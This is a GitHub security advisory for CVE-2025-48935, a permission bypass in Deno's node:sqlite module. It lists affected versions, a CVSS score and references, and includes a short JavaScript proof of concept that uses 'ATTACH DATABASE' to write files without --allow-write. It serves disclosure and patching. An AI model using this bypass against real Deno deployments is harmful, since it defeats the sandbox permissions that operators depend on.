# [M] Deno has --allow-read / --allow-write permission bypass in `node:sqlite`

## Summary
Severity: Medium
Advisory: GHSA-8vxj-4cph-c596
CVE: CVE-2025-48935
CWE: CWE-863
Ecosystem: crates.io
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2025-06-04
Source: https://github.com/advisories/GHSA-8vxj-4cph-c596
Type: github-advisory

## Affected
- crates.io: `deno` — affected >=2.2.0 <2.2.5
- crates.io: `deno_node` — affected >=0.129.0 <0.134.0

## Details
## Summary

It is possible to bypass Deno's read/write permission checks by using `ATTACH DATABASE` statement.

## PoC

```js
// poc.js
import { DatabaseSync } from "node:sqlite"

const db = new DatabaseSync(":memory:");
db.exec("ATTACH DATABASE 'test.db' as test;");

db.exec("CREATE TABLE test.test (id INTEGER PRIMARY KEY, name TEXT);");
```

```
$ deno poc.js
```

## References
- https://github.com/denoland/deno/security/advisories/GHSA-8vxj-4cph-c596
- https://nvd.nist.gov/vuln/detail/CVE-2025-48935
- https://github.com/denoland/deno/commit/31a97803995bd94629528ba841b2418d3ca01860
- https://github.com/denoland/deno
- https://rustsec.org/advisories/RUSTSEC-2025-0138.html
